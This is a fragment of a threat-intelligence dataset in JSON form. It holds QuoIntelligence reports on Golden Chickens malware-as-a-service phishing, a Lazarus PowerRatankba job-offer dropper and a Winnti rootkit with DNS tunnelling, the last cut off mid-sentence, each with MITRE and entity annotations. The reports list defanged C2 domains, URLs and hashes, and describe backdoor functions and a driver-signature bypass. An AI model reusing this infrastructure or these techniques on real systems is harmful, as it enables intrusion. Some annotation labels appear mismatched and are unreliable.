Cobalt Group.\nConclusion\n----------\nIn general, the continued adoption of threat actors leveraging MaaS plays two roles in the cyber threat landscape: (a) it enables less sophisticated actors to execute attack campaigns against high value targets, which may otherwise be out of scope due to the potentially multi-layer perimeter defenses, and; (b) it creates a cluster of technical indicators from the same infrastructure that complicates attribution efforts.\nDuring our analysis, we identified three threat actors utilizing one particular MaaS which has operated for almost two years, proving its success and profitability.\nAs a result, this scenario of multiple actors using the same MaaS further corroborates why attribution of campaigns incorporating aspects of MaaS becomes more complex to distinguish due to the presumable overlap in technical indicators.\nQuoINT continues to track the activity of these threat actors to help our customers both identify and thwart potential attacks against their environments.\n*Our Intelligence Assessment will also cover the following points:*\n* *More information about the Provider, its Operator, and the services advertised:*\n* *Assessment on current and prospected capabilities of the Provider*\n* *In depth analysis of each spear phishing campaign covered*\n* *Full IoC list per Kit, TA, and campaign*\n* *Recommended Course of Actions*\n* *MITRE ATT&CK mapping*\nYou can request it [here](/cdn-cgi/l/email-protection#9dfee8eff4f2e8eeddece8f2f4f3e9f8f1f1f4faf8f3fef8b3f8e8).\n[1] To note, we only included in the timeline those campaigns attributed to Cobalt group that used the Provider or occurred near or in the same month of GC\u2019s activities.\nHence, we excluded Cobalt\u2019s activities occurring in January, February, and March 2018.\nAdditionally, this reporting only includes intelligence obtained until October 2018.\nIndicators of Compromise\n------------------------\n### GC01\n**Email Subjects:**\nPayment Details REF # 18110486098\nPayment Details REF # 18110486098\nRe: Payment Ref 34981***** receive problem\nRe: Bank query / S-170526\u2013005399\nAmendment/Cancellation\nFund Transfer 08-October-2018\nConfirmations on October 16, 2018\nconfirmation-16003907\n**Email Attachments (Not-Malicious PDF with Google Redirector)**\n444c63bb794abe3d2b524e0cb2c8dcc174279b23b1bce949a7125df9fab25c1c\n1c1a6bb0937c454eb397495eea034e00d1f7cf4e77481a04439afbc5b3503396\n988d430ce0e9f19634cf7955eac6eb03e3b7774b788010c2a9742b38016d1ebf\n1d0aae6cff1f7a772fac67b74a39904b8b9da46484b4ae8b621a6566f7761d16\n57f65ecb239833e5a4b2441e3a2daf3513356d45e1d5c311baeb31f4d503703e\n852f11e5131d3dab9812fd8ce3cd94c1333904f38713ff959f980a168ef0d4ce\n**Google Redirector links**\nhxxps://appengine[.]google[.]com/\\_ah/logout?continue=https%3A%2F%2Fsafesecurefiles[.]com%2Fdoc041791[.]pdf\nhxxps://appengine[.]google[.]com/\\_ah/logout?continue=https%3A%2F%2Falotile[.]biz%2FDocument092018[.]doc\nhxxps://appengine[.]google[.]com/\\_ah/logout?continue=https%3A%2F%2Ffundsxe[.]com%2FDocument09202018[.]doc\nhxxps://appengine[.]google[.]com/\\_ah/logout?continue=https%3A%2F%2Ffundswp[.]com%2FDocument082018[.]doc\nhxxps://appengine[.]google[.]com/\\_ah/logout?continue=https%3A%2F%2Ftransef[.]biz%2FDoc102018[.]doc\nhxxps://appengine[.]google[.]com/\\_ah/logout?continue=https%3A%2F%2Ffundsxe[.]com%2FDocument0922018[.]doc\n**Landing Page**\nhxxps://safesecurefiles[.]com/doc041791[.]pdf\nhxxps://alotile[.]biz/Document092018[.]doc\nhxxps://fundsxe[.]com/Document09202018[.]doc\nhxxps://fundswp[.]com/Document082018[.]doc\nhxxps://transef[.]biz/Doc102018[.]doc\nhxxps://fundsxe[.]com/Document0922018[.]doc\n**Maldocs**\n19dc9b93870ddc3beb7fdeea2980c95edc489040e39381d89d0dfe0a825a1570\n020ba5a273c0992d62faa05144aed7f174af64c836bf82009ada46f1ce3b6eee\n07a3355f81ff69a197c792847d0783bfc336181d66d3a36e6b548d0dbd9f5a9a\n161ba501b4ea6f7c2c8d224e55e566fef95064e1ed059d8287bc07e790f740e8\n19dc9b93870ddc3beb7fdeea2980c95edc489040e39381d89d0dfe0a825a1570\ndc8425f8c966708b1a3c26f0545664ccbf853852af401b91ae7f29d351e2649c\ndc8425f8c966708b1a3c26f0545664ccbf853852af401b91ae7f29d351e2649c\n### GC02\n**Email Subjects:**\nContract April\nDescription of my complaint about your service\n**Email Attachments (Not-Malicious PDF with Google Redirector)**\n45310fcc9f9ef367f16bed4c4ba4c51d7eb72550082cd572f6a5636227514d70\ndf18e997a2f755159f0753c4e69a45764f746657b782f6d3c878afb8befe2b69\n**Google Redirector links**\nhxxps://appengine.googlecom/\\_ah/logout?continue=hxxps://cloud.pallets32[.]com/Doc00581691.pdf\nhxxps://appenginegooglecom/\\_ah/logout?continue=hxxps://cloudpallets32[.]com/Doc00581951pdf\nhxxps://appengine.google.com/\\_ah/logout?continue=hxxps://mail.halcyonih[.]com/uploads/doc004718538.pdf\n**Landing Page**\nhxxps://cloud.pallets32[.]com/Doc00581691.pdf\nhxxps://cloudpallets32[.]com/Doc00581951.pdf\nhxxps://mail.halcyonih[.]com/uploads/doc004718538.pdf\n**Maldocs**\n476c9d4383505429c10c31fb72f5218b3b42d985a2b46a0de62fd6ec5d08eebf\n27ec680a57b658d0e63a2b209f407253b4d8904ea025b3ef7c544d98d5798356\na1f3388314c4abd7b1d3ad2aeb863c9c40a56bf438c7a2b71cbcff384d7e7ded\n### GC Maas C2 infrastructure\noutlooklive.org[.]kz\nmail.yahoo.org[.]kz\napi.outlook[.]kz\nnl.web-cdn[.]kz\napi.toshiba.org[.]kz\napi.outlook[.]kz\napi.fujitsu.org[.]kz\napi.asus.org[.]kz\napi.miria[.]kz\nww3.cloudfront.org[.]kz\nwebmail.cloudfront.com[.]kz\nmail.halcyonih[.]com\ncloudpallets32[.]com\ncontents[.]bz\nsafesecurefiles[.]com\nusasecurefiles[.]com\nfreecloud[.]biz\nalotile[.]biz\nfundswp[.]com\ntransef[.]biz\nfundsxe[.]com\ndocument[.]cdn-one[.]biz\n[Learn more about our Threat Intelligence service](https://quointelligence.eu/#offering)\n* [Follow](https://twitter.com/QuoIntelligence \"Follow on Twitter\")[Follow](https://twitter.com/QuoIntelligence \"Twitter\")\n* [Follow](https://www.linkedin.com/company/quointelligence/ \"Follow on LinkedIn\")[Follow](https://www.linkedin.com/company/quointelligence/ \"LinkedIn\")", "mitre_ids": ["G0080", "G0080", "T1566", "T1566", "G0080", "T1566", "G0080", "TA0011", "TA0011", "T1588", "TA0011", "T1588", "T1583", "TA0011", "G0080", "T1566", "T1566", "T1583", "TA0011", "T1105", "TA0011", "TA0011", "T1566", "T1204", "T1105", "TA0011", "TA0002", "TA0011", "TA0011", "T1082", "TA0011", "T1566", "T1203", "T1059", "T1105", "T1203", "T1059", "T1566", "T1059", "T1204", "T1059", "T1027", "T1059", "T1204", "T1105", "T1059", "TA0011", "T1105", "T1059", "TA0011", "TA0011", "T1573", "TA0011", "TA0011", "T1573", "G0080", "TA0011", "TA0011", "G0080", "G0080", "T1566", "G0080", "G0080", "G0080", "T1566", "TA0011", "G0080", "G0080", "T1566", "T1586", "T1566", "T1583", "G0080", "T1586", "T1566", "G0080", "G0080", "T1204", "T1059", "T1204", "T1105", "G0080", "T1059", "T1566", "T1566", "TA0011", "TA0002", "TA0011", "T1105", "TA0011", "TA0011", "TA0011", "S0332", "S0379", "S0332", "G0080", "S0154", "G0080", "S0154", "S0154", "G0080", "G0080", "T1566", "T1566", "TA0011"], "anno_name_label": [["GROUP", "Golden Chickens"], ["GROUP", "Golden Chickens"], ["GROUP", "Golden Chickens"], ["GROUP", "Golden Chickens"], ["MALWARE", "Taurus"], ["GROUP", "Golden Chickens"], ["GROUP", "Golden Chickens"], ["GROUP", "Golden Chickens"], ["GROUP", "Golden Chickens"], ["TOOL", "VenomKit"], ["TOOL", "VenomKit"], ["TOOL", "VenomKit"], ["TOOL", "TaurusBuilderKit"], ["TOOL", "TaurusBuilderKit"], ["TOOL", "VenomKit"], ["TOOL", "TaurusBuilderKit"], ["GROUP", "Golden Chickens"], ["GROUP", "Golden Chickens"], ["GROUP", "Golden Chickens"], ["GROUP", "Golden Chickens"], ["TOOL", "VenomKit"], ["TOOL", "TaurusBuilderKit"], ["GROUP", "Golden Chickens"], ["GROUP", "Golden Chickens"], ["TOOL", "TaurusBuilderKit"], ["TOOL", "VenomKit"], ["MALWARE", "CobInt"], ["MALWARE", "CobInt"], ["MALWARE", "CobInt"], ["GROUP", "Golden Chickens"], ["GROUP", "Golden Chickens"]], "cti_entity_class": ["CE", "CE", "CE", "CE", "CE", "CE", "CE", "CI", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CI", "CE", "CI", "CI", "CE", "CE", "CI", "CE", "CE", "CE", "CI", "CI", "CE", "CI", "CI", "CE", "CI", "CI", "CI", "CE", "CE", "CI", "CI", "CI", "CE", "CE", "CE", "CI", "CI", "CI", "CI", "CE", "CI", "CE", "CE", "CI", "CE", "CI", "CI", "CI", "CE", "CI", "CE", "CE", "CE", "CI", "CE", "CE", "CI", "CE", "CE", "CE", "CI", "CE", "CE", "CI", "CE", "CE", "CE", "CI", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CI", "CE", "CI", "CE", "CI", "CI", "CE", "CE", "CE", "CI", "CI", "CE", "CI", "CI", "CE", "CI", "CI", "CI", "CE", "CE", "CE", "CI", "CI", "CE", "CE", "CE", "CE", "CI", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CI", "CE", "CE", "CE"]}, {"cti_report": "New Evidence Might Link Lazarus Tool Found in Chile RedBanc Intrusion to Previous Attacks in Pakistan\nJan 21, 2019\nNote: This article was initially written by the QuoINT Team as part of QuoScient GmbH. Since the foundation of QuoIntelligence in March 2020, this article was transferred to this website on 21 April 2020.\n**Executive Summary**\n=====================\nQuoINT has uncovered an attack against a Pakistani financial service provider\u2019s employee that highly matched the Tactics, Techniques, and Procedures (TTPs) [reported](http://www.trendtic.cl/2019/01/exclusivo-asi-fue-el-intento-de-ciberataque-a-redbanc-en-diciembre/) in a recent intrusion at the Chilean interbank network Redbanc [linked by Flashpoint](https://www.flashpoint-intel.com/blog/disclosure-chilean-redbanc-intrusion-lazarus-ties/) to the prolific North Korea-linked Advanced Persistent Threat (APT) group Lazarus (also known as HIDDEN COBRA).\nFurther, we uncovered new evidence that might link the November 2018 attacks against multiple Pakistani banks to Lazarus.\nMore in detail, we discovered an attack that occurred on 31 October 2018, and highly likely led to the infection of the employee\u2019s computer.\nHowever, we are not able to ascertain if the infection of the victim\u2019s computer successfully led to the compromise of the company.\nAlthough the timeframe of the attack falls within a period where multiple sources reported cyberattacks against Pakistani financial institutions, at this point we cannot rule out that this attack was part of a different campaign.\nAs we investigate further, we will disseminate Intelligence products to our partners and customers.\n**Introduction**\n----------------\nOn 16 January 2019, we identified a sample on VirusTotal which is almost identical to the one reportedly used to attack the Chilean financial institution Redbanc in late December 2018.\nThe sample, named ApplicationPDF.exe, was uploaded from Pakistan to VirusTotal on January 16 as a part of a ZIP archive, which also contained a generated PDF and the Windows DLL required for its execution.\nThe PDF contains what is highly likely the personal information of the targeted victim.[1]\nFurther OSINT analysis revealed the victim being an employee at a financial services provider in Pakistan and knowledgeable in financial systems and technologies including Point-of-Sales (POS) and Automated Teller Machine (ATMs).\nThe targeted profile matches the one described by Chilean newspapers while detailing the attack against RedBanc.\nThe timestamps obtained from analyzing the artifacts place this incident within a period where multiple Pakistani sources reported incidents against the local banking sector, such as the compromise of BankIslami that reportedly resulted in the loss of RS 2.6 million.\nFigure 1 highlights the timeline of malicious activity targeting both Pakistan and Chile.\nMore specifically, the timeline highlights:\n* 21 total banks notifying their customers of multiple credit card dumps for sale on the dark web (26 and 31 October);\n* BankIslami reporting suspicious transactions resulting in RS 2.6 of losses (27 October);\n* The date an unknown user located in Chile uploaded the alleged malware sample used to target RedBanc (13 December); and\n* The date the highly likely compromised user in Pakistan submitted the malware sample used to target him (16 January).\nIt is unknown, however, if this newly discovered activity is related to any of the publicly reported Pakistani incidents\n![](data:image/gif;base64,R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==)\n![](https://miro.medium.com/max/3146/1*vfN6xFPBVXy1gmzT00IksQ.png)\nFigure 1 \u2014 Timeline analysis\nTechnical Analysis\n------------------\nAccording to the reported disclosure of the RedBanc intrusion, the lure begins with a job offer posted to a social media network (LinkedIn).\nAfter clicking to apply, attackers contact the person inquiring and an interview conversation occurs, in an attempt to validate the scheme and build trust.\nThe interviewer eventually asks applicants to download and execute a tool (ApplicationPDF.exe) on their computer in order to generate their application form in PDF format.\nThe execution of the tool kicks off the infection process.\nOur initial discovery consisted of a variant of the ApplicationPDF.exe binary reportedly used against the Chilean bank.\nThe two variants are virtually the same, differing by the compilation timestamps as the figure below shows.\n![](data:image/gif;base64,R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==)\n![](https://miro.medium.com/max/1752/1*A-hUwSEgB_8Wd20CfhSPDA.png)\nFigure 2 \u2014 ApplicationPDF.exe variants\nShortly after, we identified a compressed archive also uploaded to VirusTotal containing the exact same sample, along with two additional non-malicious files, one of which is interesting for our victimology efforts.[2]\n![](data:image/gif;base64,R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==)\n![](https://miro.medium.com/max/690/1*noZvzBWg_MdP5CAnhB8awg.png)\n**Figure 3** \u2014 QuoLab screenshot of the similarity in the kill-chain between tool variants used in Chile and Pakistan\n**AppplicationPDF.exe**\n**SHA-256:** 0e3552c8232e007f421f241ea4188ea941f4d34eab311a5c2341488749d892c7 (Variant #1)\nSimilar to the dropper used in the Chilean RedBanc attack, this tool is a GUI program (Figure 4) faking an application form.\nBesides the compilation timestamp, the two variants are virtually the same.\nThe evidence obtained suggests that the victim executed ApplicationPDF.exe: the compressed archive we found also included the PDF that was most likely generated by the victim.\n![](data:image/gif;base64,R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==)\n![](https://miro.medium.com/max/1004/1*HSRzH4citBTUhhmUSj3ZzA.png)\n![](data:image/gif;base64,R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==)\n![](https://miro.medium.com/max/1004/1*S-MPNRVxlXTZpZvhV8go6w.png)\n**Figure 4 \u2014** *Dropper disguised as an application form*\nOnce executed, the sample communicates the C2 URL (hxxps://ecombox[.]store/tbl\\_add[.]php?action=agetpsb), and after connecting, it drops a script file (REG\\_TIME.ps1) used to invoke the PowerShell process.\n**PowerRatankba variant** (REG\\_TIME.ps1)\n**SHA-256:** a1f06d69bd6379e310b10a364d689f21499953fa1118ec699a25072779de5d9b\nThe script arrives encrypted and will decrypt itself in memory to the following sample:\n**Decrypted\\_PowerRatankba variant** (REG\\_TIME.ps1)\n**SHA-256:** 9797ad321f2eb123c3531d007295b8d4a672a40afd8b1681974b5349bab55ba1\nPowerRatankba is a PowerShell based reconnaissance tool that conducts initial information gathering from the victim\u2019s system and functions as a backdoor.\nIn both Chile and Pakistan, the same variant is delivered, thus, accepts the same six commands, contains the same hardcoded C2 URL (hxxps://ecombox[.]store/tbl\\_add.php) and commented out C2 (hxxps://bodyshoppechiropractic[.]com/tbl\\_add.php).\nThe backdoor functionality provided by the toolkit could enable the actor to deploy further stages of the attack if the victim\u2019s system is deemed interesting.\nPowerRatankba is capable of the following functions:\n* Send data to the server\n* Delete agent\n* Modify and replace files (.ps1 and .VBS)\n* Download files\n* Kill agent (exit)\n* Delay execution\n* Encrypted panel commands (sdel | run)\n* No command executes a batch script\nIn December 2017, researchers first discovered and documented [PowerRatankba](https://www.proofpoint.com/us/threat-insight/post/north-korea-bitten-bitcoin-bug-financially-motivated-campaigns-reveal-new).\nReportedly, the malware is a successor to an earlier implant dubbed Ratankba, used within the Lazarus group\u2019s financially focused attacks.\nWe identified an [earlier version](https://www.hybrid-analysis.com/sample/db8163d054a35522d0dec35743cfd2c9872e0eb446467b573a79f84d61761471?environmentId=100) of [PowerRatankba](https://www.proofpoint.com/us/threat-insight/post/north-korea-bitten-bitcoin-bug-financially-motivated-campaigns-reveal-new) submitted to Hybrid Analysis in January 2018, and comparative analysis of the sample in both cases exhibits some aspects of evolution.\nNotably, it offers the same basic functionality, but differently named commands (e.g. killkill instead of kagent) and some optimization in a few places.\nLazarus is known for continuously evolving its toolset and Tactics, Techniques and Procedures (TTPs).\n**itextsharp.dll**\n**SHA-256:** 2938200b7c0300c31aa458860b9f4f684f4f3f5893ab0f1d67c9d797168cad17\nThe DLL file appears to be a legit implementation of the PDF generation library called iTextSharp.\nThe application program requires this external library to generate the PDF mentioned initially by the threat actor.\nTo note, this file is not required for the malicious functionality of the application program.\n**#ApplicantsName#.pdf**\nThe PDF is the printed version of the application filled out by the user, containing the same fields.\nIf an applicant fills out all the fields of the application and clicks finish in the last step, it will generate this exact file based on the supplied data.\nHowever, the PDF generation only works if the DLL is present in the same directory as the application program.\nFigure 5 shows a redacted version of the analyzed PDF.\n![](data:image/gif;base64,R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==)\n![](https://miro.medium.com/max/858/1*kzYCcSTkeYdB7eGiXDQnkg.png)\nFigure 5 \u2014 Redacted version of the PDF containing victim\u2019s personal information\n**Victim**\n==========\nAcquiring the user generated PDF from completing the fake application made the victimology process more precise.\nFirstly, it is clear that the victim is interested in a position with Cards and Payment Systems and has experience with POS and ATM Acquiring, EMV Contact and Contactless and Mobile.\nSecondly, OSINT analysis revealed the identity of the targeted individual on social media and his current employment, directly or as a contractor, as an IT professional by an entity within the financial services industry.\nConsidering the initial attack vector used in Chile also targeted an IT staff member at RedBanc, it is highly likely that the same threat actors would target the above described individual.\n**Conclusion**\n==============\nLazarus is an APT threat actor group that has operated since at least 2009, and attributed to a variety attacks across multiple sectors including financials, and entertainment.\nWhile we have evidence to support that this latest activity occurred during the timeframe where multiple Pakistani banks were heavily targeted by cyber criminals, we still cannot confirm that all those attacks were committed by the same threat actor.\n[1] At this time, we cannot entirely rule out this artifact being part of a deception operation.\n[2] This blog post does not include any Personal Identifiable Information of the victim.\nHowever, we contacted the affected company in order to let them aware of the incident.\n[Learn more about our Threat Intelligence service](https://quointelligence.eu/#offering)\n* [Follow](https://twitter.com/QuoIntelligence \"Follow on Twitter\")[Follow](https://twitter.com/QuoIntelligence \"Twitter\")\n* [Follow](https://www.linkedin.com/company/quointelligence/ \"Follow on LinkedIn\")[Follow](https://www.linkedin.com/company/quointelligence/ \"LinkedIn\")", "mitre_ids": ["G0032", "G0032", "G0032", "G0032", "T1204", "T1566", "T1566", "T1204", "T1204", "TA0011", "T1105", "T1059", "T1140", "TA0043", "T1059", "TA0007", "TA0003", "TA0011", "TA0011", "T1071", "T1071", "T1105", "TA0010", "T1562", "T1059", "T1059", "T1105", "T1562", "TA0002", "T1059", "G0032", "G0032", "G0032"], "anno_name_label": [["MALWARE", "Power Ratankba"], ["MALWARE", "Power Ratankba"], ["MALWARE", "Power Ratankba"], ["MALWARE", "Power Ratankba"], ["TECHNIQUE", "Process Injection: Ptrace System Calls"], ["MALWARE", "Power Ratankba"], ["MALWARE", "Power Ratankba"], ["MALWARE", "Power Ratankba"]], "cti_entity_class": ["CE", "CE", "CE", "CE", "CI", "CI", "CI", "CI", "CI", "CE", "CI", "CI", "CE", "CI", "CE", "CE", "CE", "CI", "CI", "CI", "CE", "CE", "CI", "CI", "CI", "CE", "CI", "CI", "CI", "CI", "CI", "CI", "CI", "CE", "CI", "CE", "CE", "CE", "CE", "CE", "CE"]}, {"cti_report": "WINNTI GROUP: Insights From the Past\nApr 20, 2020\nNewly uncovered DNS tunnelling technique, and new campaign against South Korean gaming company\n----------------------------------------------------------------------------------------------\n### Executive Summary\n* In January 2020, [QuoIntelligence](https://quointelligence.eu/) (QuoINT) detected a new Winnti sample uploaded to a public virus scanner from a German location.\nFollowing our preliminary analysis, we assessed with high confidence that the sample was used to target a previously unreported German chemical company.\nAs part of our responsible disclosure, we alerted the affected entity, the local Law Enforcements, and our clients.\n* In the following weeks after our internal reporting, the German news media source Tagesschau [reported](https://www.tagesschau.de/investigativ/ndr/hackerangriff-chemieunternehmen-101.html)\u00a0our initial detection and analysis of the sample, and confirmed the chemical company\u2019s awareness of the attack in the second half of 2019.\n* The Winnti sample we analysed was highly likely developed in 2015, and likely used around this year for the first time, it is unclear how long the compromise existed in the compromised environment.\n* Although the malware was likely used years ago, further analysis revealed a previously unreported C2 technique never attributed to any Winnti Group\u2019s toolkits.\n* The technique relies on a DNS Tunneling communication channel through a custom implementation of the [iodine source code](https://github.com/yarrick/iodine), an open-source software that enables the tunneling of IPv4 data through a DNS server.\n* Additionally, we uncovered a previously unknown stolen digital certificate being used to digitally sign Winnti-related attack components, and the targeting of a previously-unreported South Korean video game company.\n* The sophistication of the techniques we uncovered confirms that the Winnti Group is a highly sophisticated, and highly committed Advanced Persistent Group \u00a0targeting a plethora of different industry sectors in Europe and South Asia.\n### Introduction\nThe Winnti Group (also known as APT41, BARIUM, and Blackfly) is an alleged Chinese state-sponsored umbrella organization in China\u2019s intelligence branch linked through their use of shared goals and attack resources.\nThe suspected state-sponsor link to China\u2019s government pinpoints that it likely has an incentive to continue targeting a variety of industries, especially one\u2019s highlighted as priority for China\u2019s economic development.\nOn Friday, 13 January, QuoIntelligence (QuoINT) detected a new Winnti sample uploaded to a public virus scanner from a German location.\nFollowing our preliminary analysis, we assessed with high confidence that the sample was used to target a previously unreported German chemical company.\nAdditionally, during our analysis we uncovered a previously unknown stolen digital certificate being used to digitally sign Winnti related drivers, and a potential campaign against an already known South Korean video game company.\nIn the last year, researchers and journalists have publicly disclosed that the Winnti group targeted and eventually compromised Henkel (2014), BASF (2015), Bayer (2018) and Roche (2019).\nThis most recent\u00a0previously unreported German chemical company is yet another German chemical company targeted by Winnti since 2015.\nPrior to our analysis this attack activity was not publicly reported.\n![](data:image/gif;base64,R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==)\n![](https://quointelligence.eu/wp-content/uploads/2020/04/Picture-1-1.png)\n*Figure 1: Timeline of attacks located in Germany and attributed to Winnti*\nIn December 2019, Germany\u2019s Federal Office for the Protection of the Constitution (BfV) released a [report](https://www.verfassungsschutz.de/download/broschuere-2019-12-bfv-cyber-brief-2019-01.pdf) related to the alleged Chinese state sponsored umbrella organization known as the Winnti Group.\nThrough our internal malware analysis, we are confident that the sample we discovered is highly similar to the Winnti sample described in the BfV report.\nThe sample also matches known characteristics of Winnti\u2019s arsenal shared through intelligence reports produced by [ESET](https://www.welivesecurity.com/wp-content/uploads/2019/10/ESET_Winnti.pdf).\nFurther, we have informed the affected company, law enforcement agencies, and sent a Warning to our customers upon detection.\n### The Winnti Group\nThe Winnti Group (also known as APT41, BARIUM, and Blackfly) is an alleged Chinese state-sponsored umbrella organization in China\u2019s intelligence branch linked through their use of shared goals and attack resources.\nNotably, various operations attributed to other China-linked threat actor groups, such as APT17 and Ke3chang, have also leveraged its backdoor malware.\nActive since at least 2010, initial attacks attributed to the group heavily targeted the gaming industry.\nHowever, as researchers have continued to follow and dissect the group and its activity, the group\u2019s target focus has expanded to other industries, including chemical, pharmaceutical, technology, and software.\nFurther, the group\u2019s evolution involves the enhancement, development, and inclusion of new tools and tactics.\nThe suspected state-sponsor link to China\u2019s government, pinpoints that it likely has an incentive to continue targeting a variety of industries, especially one\u2019s highlighted as priority for China\u2019s economic development.\nIn the latest Winnti Group public report, FireEye researchers [reported](https://www.fireeye.com/blog/threat-research/2020/03/apt41-initiates-global-intrusion-campaign-using-multiple-exploits.html) of a new widespread campaign attributed to APT41 which involves exploitation attempts of recently disclosed and patched vulnerabilities for products of Cisco, Citrix, and Zoho.\nThe campaign waves apparently take a more targeted approach to selecting potential victims across various sectors including financials, government, and information technology.\nAccording to the researchers, identified victim systems demonstrated the threat actor leveraged commercially available post exploitation tools such as Cobalt Strike and Meterpreter, which are essentially full featured backdoors.\nTechnical Analysis\n------------------\n### Sample Targeting German Chemical Company\nThe main artifact uploaded to VirusTotal is a Dynamic Link Library (DLL) file, with a compilation timestamp suggesting the sample was built in August 2015.\nAlthough the compilation time might be legitimate, it is not possible to determine when and how long the attackers used this malware.\n| **HASHES** | **Compilation**\n**Timestamp** | **Filename** |\n| **MD5:** c893a12ff72698f09f89f778e4c9cd2b\n**SHA1**: 06256946a69409cd18859bfa429184a282374d76\n**SHA256:** df6af36626d375c5e8aff45c64bfc1975d753b109e126a6cb30ee0523550329c | 2015-08-06 01:52:51 | TmPfwRVS.dll |\n*Table 1 \u2013 Winnti sample*\n### Binary Analysis\nSimilar to other Winnti samples, the configuration section contains a string referring to the name of the campaign.\nIn this case, at 0X020, the referred campaign name is the name of the chemical company \u2013 redacted for the purposes of this blog.\n*![](data:image/gif;base64,R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==)![](https://quointelligence.eu/wp-content/uploads/2020/04/Figure-X-1.png)*\n*Figure 2 \u2013 Extracted configuration from Winnti sample*\nThe analysed artifact we observed contains the\u00a0 following binaries listed below, and also aligns with observations in the BfV report.\n| **HASHES** | **Compilation Timestamp** | **Filename** |\n| **MD5:** c893a12ff72698f09f89f778e4c9cd2b\n**SHA1**: 06256946a69409cd18859bfa429184a282374d76\n**SHA256:**\ndf6af36626d375c5e8aff45c64bfc1975d753b109e126a6cb30ee0523550329c | 2015-08-06 01:52:51 | TmPfwRVS.dll |\n| **MD5**: cf140dc4cad9e8216545593a4c08c7be\n**SHA1**: 2b319b44451abb0596b9187e06f1fb7b4ace969d\n**SHA256**: bfa8948f72061eded548ef683830de068e438a6eaf2da44e0398a37ac3e26860 | 2015-08-05 12:08:00 | driver1.sys |\n| **MD5**: cc95391d75ce2443740f60114fe30ae9\n**SHA1**: 30d1dd1dd4f0ace7a4f2c24e31fb6a0ee33e8a3a\n**SHA256**: 8ddc6dd9fc3640cd786dfbc72212cd001d9369817aa69e0a2fa25e29560badcf | 2015-05-05 11:31:13 | driver2.sys |\n| **MD5**: b4e66b445b39d0368bbe4b91a3cd98ff\n**SHA1**: 2bc358ddc72f59ba0373b8635ab08ad747c12180\n**SHA256**: 1865013aaca0f12679e35f06c4dad4e00d6372415ee8390b17b4f910fee1f7a2 | 2014-12-15 16:06:41 | dsefix.exe |\n| **MD5**: eaea9ccb40c82af8f3867cd0f4dd5e9d\n**SHA1**: 7c1b25518dee1e30b5a6eaa1ea8e4a3780c24d0c\n**SHA256**: cf3a7d4285d65bf8688215407bce1b51d7c6b22497f09021f0fce31cbeb78986 | 2008-May-31 02:18:53 UTC | vboxdrv.sys |\n*Table 2 \u2013 Additional artifacts contained by bfa8948f72061eded548ef683830de068e438a6eaf2da44e0398a37ac3e26860*\n**Analysis of dsefix.exe**\nThis is essentially [Windows x64 Driver Signature Enforcement Overrider](https://github.com/hfiref0x/DSEFix) (DSEFix), used\u00a0 \u00a0to temporarily disable the driver signature enforcement on Windows systems by using an included old, legit VirtualBox driver, both signed and exploitable.\nBy running dsefix.exe, the malware can bypass driver verification and install its own drivers.\nWe identified the following two drivers which were embedded in the earlier described main artifact.\nTo note that this technique does not work on moden Windows (e.g. Windows 10) \u2013 yet another piece of evidence that this malware was designed and used multiple years ago.\n**Analysis of vboxdriver**\nThis is the vulnerable, correctly signed with a digital certificate, VirtualBox driver that is used for exploitation.\nIt is used regularly by various threat actors, and by the previously highlighted dsefix.exe*.* The driver can also be used to perform the Turla Driver Loader (TDL) exploitation [technique](https://github.com/hfiref0x/TDL), a similar technique as DSEFix.\n**Analysis of driver1.sys**\nIn late 2019, [ExaTrack](https://exatrack.com/public/winnti_EN.pdf)released their analysis of a signed Winnti rootkit previously observed in the wild, which we confirm is essentially the same rootkit driver.\nThe sample is capable of injecting raw packets into the network and receiving special formatted packets.\nIn comparison, our variant has the same exact number of bytes, and there are large parts exactly matching.\n**Analysis of driver2.sys**\nThis rootkit driver seems to be largely the same as driver1.sys with the same characteristics including structure, I/O control, and device strings.\nHowever, this driver supports different versions of Windows.\nIt checks for ranges of Windows New Technology (NT) build numbers and returns early.\n### C2 DNS Tunneling\nBy analyzing the malware, it is possible to find two network indicators within its code:\n```\n![](data:image/gif;base64,R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==)\n![](https://quointelligence.eu/wp-content/uploads/2020/04/Figure-2-1024x82.png)\n```\n*Figure 3 \u2013 observed network IoCs in Winnti sample*\nThe hardcoded 208.67.222.222 is a legitimate OpenDNS DNS server (resolver1.opendns.com).\nThis IP is pushed into a list that is generated by the malware at runtime. Likely, the initiation routine also populates the list with the system\u2019s DNS, and the OpenDNS server is only used as fallback case to ensure the C2 domain gets resolved.\nThe dick[.]mooo[.]com FQDN name is offered by [FreeDNS](https://freedns.afraid.org/), which is a free dynamic DNS service.\nNotably, in the last years, multiple researchers have reported Winnti/PlugX C2 hostnames hosted in the mooo[.]com zone.\nIn the code we observed that a dot (.) is enforced before the FQDN*.* Additional analysis revealed that the malware generates subdomains with base128 encoding, and append them to FQDN.\n![](data:image/gif;base64,R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==)\n![](https://quointelligence.eu/wp-content/uploads/2020/04/Figure-y.png)\n*Code 1 \u2013 Hostname length restriction*\nFurther, dots are added into it every 57 characters potentially as a hostname length restriction, suggesting the expectation of long hostnames.\nWe confirm the buffer can support FQDN\u2019s up to 2000 characters.\nUpon further investigation we found out that the malware includes the open source [iodine source code](https://github.com/yarrick/iodine) \u2013 software that enables the tunneling of IPv4 data through a DNS server.\nInterestingly, we are not aware of any earlier documentation highlighting Winnti specifically leveraging iodine for DNS tunneling.\nHowever, researchers at the Ruhr University Bochum, while hunting for DNS tunnels, 